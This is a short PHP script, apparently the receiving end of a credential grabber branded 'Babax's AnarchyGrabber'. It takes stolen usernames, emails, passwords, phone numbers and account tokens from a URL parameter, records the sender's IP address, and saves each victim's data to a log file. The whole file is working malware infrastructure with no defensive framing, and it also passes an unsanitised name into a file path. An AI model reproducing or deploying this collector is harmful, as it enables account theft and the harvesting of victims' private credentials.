<?php

if (isset($_GET['input'])) {
	
	$string = $_GET['input'];

	$string = str_replace("[HASHTAG]", "#", $string);
	$str_arr = explode ("|", $string);  

	if (!file_exists('logs')) {
		mkdir('logs', 0777, true);
	}

	if (file_exists('logs/'.$str_arr[0].'.txt')) {
	   unlink('logs/'.$str_arr[0].'.txt');
	}

	$fp = fopen('logs/'.$str_arr[0].'.txt', 'a');

	fwrite($fp, "Brought you by Babax's AnarchyGrabber".PHP_EOL);
	fwrite($fp, ''.PHP_EOL);
	fwrite($fp, 'Username: '.$str_arr[0].PHP_EOL);
	fwrite($fp, 'Email: '.$str_arr[1].PHP_EOL); 
	fwrite($fp, 'Password: '.$str_arr[2].PHP_EOL); 
	fwrite($fp, 'Phone: '.$str_arr[3].PHP_EOL); 
	fwrite($fp, 'Token: '.$str_arr[4].PHP_EOL);   
	fwrite($fp, 'IP: '.$_SERVER['REMOTE_ADDR'].PHP_EOL);

	fclose($fp);
}


?>